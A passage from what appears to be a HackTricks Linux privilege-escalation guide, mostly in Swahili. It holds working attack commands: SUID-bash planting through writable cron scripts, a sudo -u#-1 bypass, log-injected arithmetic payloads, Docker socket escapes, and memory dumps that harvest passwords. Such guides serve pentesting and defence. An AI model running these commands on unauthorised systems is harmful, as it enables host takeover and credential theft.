# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata taarifa kuhusu OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa una **ruhusa za kuandika kwenye folda yoyote ndani ya `PATH`** huenda ukaweza hijack some libraries or binaries:
```bash
echo $PATH
```
### Taarifa za Env

Je, kuna taarifa za kuvutia, nywila au API keys katika variables za mazingira?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia kernel version na kama kuna exploit ambayo inaweza kutumika ku-escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zilizo hatarini na baadhi ya **compiled exploits** tayari hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa toleo zote za kernel zilizo hatarini kutoka kwenye tovuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Zana ambazo zinaweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Daima **tafuta kernel version kwenye Google**, labda kernel version yako imeandikwa katika baadhi ya kernel exploits na hivyo utakuwa na uhakika kwamba exploit hiyo ni halali.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo toleo

Kulingana na matoleo dhaifu ya sudo yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia ikiwa toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii ingeweza kutumika
```bash
dmesg 2>/dev/null | grep "signature"
```
### Zaidi ya system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha kinga zinazowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Kama uko ndani ya docker container unaweza kujaribu kutoroka kutoka ndani yake:


{{#ref}}
docker-security/
{{#endref}}

## Diski

Angalia **what is mounted and unmounted**, wapi na kwa nini. Ikiwa kitu chochote kipo unmounted unaweza kujaribu ku-mount na kukagua taarifa binafsi
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia kama **kuna compiler yoyote imewekwa**. Hii ni muhimu ikiwa unahitaji kutumia baadhi ya kernel exploit, kwani inashauriwa ku-compile kwenye mashine utakayotumia (au kwenye ile inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Iliyosakinishwa

Angalia **toleo la vifurushi na huduma zilizosakinishwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumika kupandisha ruhusa…\
Inapendekezwa kukagua kwa mikono toleo la programu zilizosakinishwa zinazoshukiwa zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Kama una ufikiaji wa SSH kwa mashine unaweza pia kutumia **openVAS** kukagua programu zilizopitwa na wakati na zilizo na udhaifu zilizosakinishwa ndani ya mashine.

> [!NOTE] > _Kumbuka kuwa amri hizi zitaonyesha taarifa nyingi ambazo kwa kawaida hazitakuwa muhimu, kwa hivyo inashauriwa kutumia programu kama OpenVAS au nyingine zinazofanana zitakazokagua ikiwa toleo lolote la programu lililosakinishwa lina udhaifu dhidi ya exploits zinazojulikana_

## Michakato

Tazama **ni michakato gani** inaendeshwa na angalia ikiwa mchakato wowote una **idhini zaidi kuliko inavyotakiwa** (labda tomcat inaendeshwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Kila wakati angalia uwezekano wa [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** inazitambua kwa kuangalia parameter ya `--inspect` ndani ya mstari wa amri wa mchakato.\
Pia **angalia ruhusa zako juu ya binaries za michakato**, labda unaweza kuandika juu ya binary ya mtu mwingine.

### Ufuatiliaji wa mchakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa muhimu sana kutambua michakato iliyo vunwa inayotekelezwa mara kwa mara au wakati seti ya mahitaji yanatimizwa.

### Kumbukumbu ya mchakato

Baadhi ya services za server huhifadhi **credentials in clear text inside the memory**.\
Kwa kawaida utahitaji **root privileges** kusoma kumbukumbu za michakato inayomilikiwa na watumiaji wengine, kwa hivyo hii kawaida ni muhimu zaidi unapokua tayari root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma kumbukumbu za michakato unayomiliki**.

> [!WARNING]
> Kumbuka kwamba siku hizi mashine nyingi **don't allow ptrace by default** ambayo inamaanisha kwamba huwezi ku-dump michakato mingine inayomilikiwa na mtumiaji wako asiyekuwa na ruhusa.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ inasimamia ufikikaji wa ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. Huu ni mtindo wa kawaida jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged. 
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Mara imewekwa, reboot inahitajika ili kuwezesha ptracing tena.

#### GDB

Ikiwa una ufikiaji wa kumbukumbu ya huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani yake credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa kitambulisho cha mchakato (PID) kilichotolewa, **maps zinaonyesha jinsi kumbukumbu inavyopangwa ndani ya nafasi ya anwani pepe ya mchakato huo**; pia zinaonyesha **idhinishaji za kila eneo lililopangwa**. Faili bandia **mem** **inafichua kumbukumbu ya mchakato yenyewe**. Kutoka kwenye faili ya **maps** tunajua ni **maeneo ya kumbukumbu yanayosomwa** na offsets zao. Tunatumia taarifa hii **kutafuta ndani ya faili ya mem na kumwaga maeneo yote yanayosomwa** hadi faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikiaji kwa kumbukumbu ya mfumo ya **kimwili**, si kumbukumbu ya virtual. Eneo la anwani za virtual la kernel linaweza kufikiwa kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kundi la **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa linux

ProcDump ni toleo la Linux lililobuniwa upya la zana klasiki ProcDump kutoka kwenye mkusanyiko wa zana za Sysinternals kwa Windows. Pata kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Zana

Ili dump kumbukumbu ya mchakato unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa kwa mkono mahitaji ya root na dump mchakato unaomilikiwa na wewe
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Kredensiali kutoka Kumbukumbu ya Mchakato

#### Mfano wa mkono

Kama utagundua kuwa mchakato wa authenticator unaendesha:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza dump the process (tazama sehemu za awali ili kupata njia tofauti za dump the memory of a process) na utafute credentials ndani ya memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Chombo [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **kitapora clear text credentials kutoka memory** na kutoka kwa baadhi ya **faili zinazojulikana**. Kinahitaji root privileges ili kifanye kazi ipasavyo.

| Kipengele                                          | Jina la mchakato     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Regexes za utafutaji/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

Angalia kama kazi yoyote iliyopangwa ina udhaifu. Labda unaweza kuchukua faida ya script inayotekelezwa na root (wildcard vuln? unaweza kubadilisha faili ambazo root anazitumia? tumia symlinks? unda faili maalum katika saraka ambayo root anaitumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi user ana ruhusa za kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii user root anajaribu kutekeleza amri au script bila kuweka PATH. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Kisha, unaweza kupata root shell kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron inayotumia script yenye wildcard (Wildcard Injection)

Ikiwa script inatekelezwa na root na ina “**\***” ndani ya command, unaweza kuitumia kufanya mambo yasiyotegemewa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imewekwa kabla ya njia kama** _**/some/path/\***_ **, haiko hatarini (hata** _**./\***_ **sio).**

Soma ukurasa ufuatao kwa mbinu zaidi za kutumia wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash hufanya parameter expansion na command substitution kabla ya arithmetic evaluation ndani ya ((...)), $((...)) na let. Ikiwa root cron/parser inasoma field za log zisizo za kuaminiwa na kuziingiza kwenye context ya arithmetic, mshambuliaji anaweza kuingiza command substitution $(...) ambayo itaendeshwa kama root wakati cron inaendesha.

- Kwa nini inafanya kazi: In Bash, expansions hufanyika kwa mpangilio huu: parameter/variable expansion, command substitution, arithmetic expansion, kisha word splitting na pathname expansion. Kwa hiyo thamani kama `$(/bin/bash -c 'id > /tmp/pwn')0` huwasilishwa kwanza (ukiendesha amri), kisha nambari iliyobaki `0` inatumiwa kwa arithmetic hivyo script inaendelea bila makosa.

- Mfano wa kawaida ulio dhaifu:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Andika maandishi yanayodhibitiwa na mshambuliaji kwenye log inayochunguzwa ili uwanja unaonekana kama nambari uwe na command substitution na uishie na digit. Hakikisha amri yako haichapishi kwenye stdout (au uielekeze) ili arithmetic ibaki halali.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Kuandika upya script ya cron na symlink

Ikiwa unaweza **kubadilisha script ya cron** inayotekelezwa na root, unaweza kupata shell kwa urahisi sana:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **saraka ambapo una ufikiaji kamili**, inaweza kuwa msaada kufuta saraka hiyo na **kuunda saraka ya symlink kuelekea nyingine** inayohudumia script inayodhibitiwa na wewe
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron jobs za mara kwa mara

Unaweza kufuatilia processes ili kutafuta zile zinazotekelezwa kila dakika 1, 2 au 5. Labda unaweza kutumia fursa hiyo na escalate privileges.

Kwa mfano, ili **monitor every 0.1s during 1 minute**, **sort by less executed commands** na kufuta commands ambazo zimeendeshwa mara nyingi zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila process inayoanza).

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob **kuweka carriage return baada ya comment** (bila newline character), na cronjob itafanya kazi. Mfano (tazama carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Faili za _.service_ zinazoweza kuandikwa

Angalia kama unaweza kuandika faili yoyote ya `.service`, ikiwa unaweza, unaweza **kuibadilisha** ili **itekeleze** backdoor yako **wakati** huduma inapo **anzishwa**, **ianzishwa upya** au **imesitishwa** (labda utahitaji kusubiri hadi mashine ianze upya).\
Kwa mfano tengeneza backdoor yako ndani ya faili ya .service kwa **`ExecStart=/tmp/script.sh`**

### Binari za huduma zinazoweza kuandikwa

Kumbuka kuwa ikiwa una **idhini ya kuandika kwenye binari zinazotekelezwa na huduma**, unaweza kuzibadilisha kuwa backdoors ili wakati huduma zitakapotekelezwa tena backdoors zitatekelezwa.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumika na **systemd** kwa:
```bash
systemctl show-environment
```
Iwapo utagundua kwamba unaweza **write** katika yoyote ya folda za njia hiyo, huenda ukaweza **escalate privileges**. Unahitaji kutafuta **relative paths being used on service configurations** faili kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza an **executable** yenye **jina sawa na relative path binary** ndani ya systemd PATH folder unayoweza kuandika, na wakati service itakapoulizwa kutekeleza hatua iliyo dhaifu (**Start**, **Stop**, **Reload**), yako **backdoor** itatekelezwa (watumiaji wasio na ruhusa kawaida hawawezi kuanza/kuacha services lakini angalia ikiwa unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services na `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files ambazo majina yao huisha kwa `**.timer**` ambazo husimamia `**.service**` files au matukio. **Timers** zinaweza kutumika kama mbadala wa cron kwa kuwa zina msaada uliojengwa ndani kwa matukio ya kalenda na matukio ya monotonic time, na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kubadilisha timer, unaweza kuifanya itekeleze baadhi ya systemd.unit (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
> Unit itakayowashwa wakati timer hii itakapomalizika. Hoja ni jina la unit, ambalo kiambishi chake si ".timer". Ikiwa haijaainishwa, thamani hii huanzia kwa .service ambayo ina jina sawa na timer unit, isipokuwa kwa kiambishi. (Angalia hapo juu.) Inashauriwa kwamba jina la unit linalowashwa na jina la timer unit viiwe vimeitwa vivyo hivyo, isipokuwa kwa kiambishi.

Hivyo, ili kudhulumu ruhusa hii utahitaji:

- Pata systemd unit (kama a `.service`) ambayo inafanya **executing a writable binary**
- Pata systemd unit ambayo inafanya **executing a relative path** na wewe una **writable privileges** juu ya **systemd PATH** (ili kujifanya executable hiyo)

Learn more about timers with `man systemd.timer`.

### **Kuwezesha Timer**

Ili kuwezesha timer unahitaji root privileges na kuendesha:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka **timer** inavyo **wezeshwa** kwa kuunda symlink kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) zinawezesha **mawasiliano ya mchakato** kwenye mashine moja au tofauti ndani ya mifano ya client-server. Zinatumia faili za descriptor za Unix za kawaida kwa mawasiliano kati ya kompyuta na huwekwa kupitia faili za `.socket`.

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu sockets kwa `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguzi hizi ni tofauti lakini kwa muhtasari hutumika **kuonyesha mahali itakaposikiliza** socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au nambari ya bandari kusikiliza, n.k.)
- `Accept`: Inachukua hoja ya boolean. Ikiwa **true**, **service instance inazaliwa kwa kila muunganisho unaoingia** na socket ya muunganisho pekee ndiyo hupitishwa kwake. Ikiwa **false**, sockets zote zinazolisikilizwa zinapitishwa kwa started service unit, na service unit moja tu ndiyo inazaliwa kwa muunganisho yote. Thamani hii haizingatiwi kwa datagram sockets na FIFOs ambapo service unit moja bila sharti hushughulikia trafiki yote inayoingia. **Default ni false**. Kwa sababu za utendaji, inashauriwa kuandika daemons mpya kwa njia inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Inachukua mistari ya amri moja au zaidi, ambayo hufanywa **kabla** au **baada** sockets/FIFOs zinazolisikilizwa kuundwa na kuwekewa bind, kwa mtiririko huo. Token ya kwanza ya mstari wa amri lazima iwe jina la faili kamili (absolute), ikifuatiwa na hoja za mchakato.
- `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo zinatekelezwa **kabla** au **baada** sockets/FIFOs zinazolisikilizwa kufungwa na kuondolewa, mtiririko huo.
- `Service`: Inaeleza jina la service unit **kutumika** kwa **trafiki inayoingia**. Mipangilio hii inaruhusiwa tu kwa sockets zenye Accept=no. Kwa default inatumia service yenye jina sawa na socket (kwa kubadilisha kiambishi). Katika hali nyingi, haitakuwa lazima kutumia chaguo hili.

### Writable .socket files

Ikiwa utapata faili ya `.socket` ambayo inaweza kuandikwa unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket kuundwa. Kwa hiyo, **labda utahitaji kusubiri hadi mashine ianzishwe upya.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Ikiwa **utatambua socket yoyote inayoweza kuandikwa** (_sasa tunazungumzia Unix Sockets na si faili za usanidi `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na labda utumie udhaifu.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho mbichi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kuwa kunaweza kuwa na baadhi ya **sockets listening for HTTP** requests (_Sio kuhusu .socket files, bali kuhusu mafaili yanayotenda kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ikiwa socket **responds with an HTTP** request, basi unaweza **communicate** nayo na labda **exploit some vulnerability**.

### Docker Socket Inayoweza Kuandikwa

Docker socket, mara nyingi hupatikana katika `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa chaguo-msingi, inaweza kuandikwa na mtumiaji `root` na wanachama wa kikundi cha `docker`. Kuwa na haki ya kuandika kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna muhtasari wa jinsi hili linaweza kufanywa na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation with Docker CLI**

Ikiwa una write access kwenye Docker socket, unaweza escalate privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Amri hizi zinakuwezesha kuendesha container ukiwa na root-level access kwenye filesystem ya host.

#### **Kutumia Docker API Moja kwa moja**

Katika matukio ambapo Docker CLI haipatikani, docker socket bado inaweza kudhibitiwa kwa kutumia Docker API na amri za `curl`.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kuanzisha muunganisho wa `socat`, unaweza kutekeleza amri moja kwa moja ndani ya container ukiwa na root-level access kwenye filesystem ya host.

### Wengine

Kumbuka kwamba ikiwa una write permissions juu ya docker socket kwa sababu uko **inside the group `docker`** una [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **more ways to break out from docker or abuse it to escalate privileges** katika:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Kama ugundua kwamba unaweza kutumia amri ya **`ctr`**, soma ukurasa ufuatao kwani **huenda ukaweza kuitumia vibaya ili escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Kama ugundua kwamba unaweza kutumia amri ya **`runc`**, soma ukurasa ufuatao kwani **huenda ukaweka ili abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo wa kisasa wa **inter-Process Communication (IPC) system** unaowezesha applications kuwasiliana kwa ufanisi na kushirikiana data. Umebuniwa kwa kuzingatia mfumo wa kisasa wa Linux, hutoa fremu thabiti kwa aina mbalimbali za mawasiliano ya application.

Mfumo huo ni mwepesi, unaounga mkono IPC ya msingi inayoboreshwa kubadilishana data kati ya michakato, ikikumbusha **enhanced UNIX domain sockets**. Zaidi ya hayo, husaidia kusambaza matukio au ishara, kukuza uunganishaji bila mshono kati ya vipengele vya mfumo. Kwa mfano, ishara kutoka kwa Bluetooth daemon kuhusu simu inayokuja inaweza kusababisha music player ku-mute, kuboresha uzoefu wa mtumiaji. Aidha, D-Bus inaunga mkono mfumo wa remote object, kurahisisha service requests na method invocations kati ya applications, kurahisisha michakato ambayo hapo awali ilikuwa ngumu.

D-Bus inafanya kazi kwa msingi wa **allow/deny model**, ikisimamia ruhusa za ujumbe (method calls, signal emissions, n.k.) kulingana na athari ya jumla ya sheria za sera zinazofanana. Sera hizi zinaeleza mwingiliano na bus, na zinaweza kuruhusu privilege escalation kupitia udanganyifu wa ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umeonyeshwa, ukielezea ruhusa kwa mtumiaji root kumiliki, kutuma kwa, na kupokea ujumbe kutoka kwa `fi.w1.wpa_supplicant1`.

Sera ambazo hazina mtumiaji au kundi maalum zinatumika kwa wote, wakati sera za muktadha "default" zinatumika kwa wale waliotengwa na sera maalum nyingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
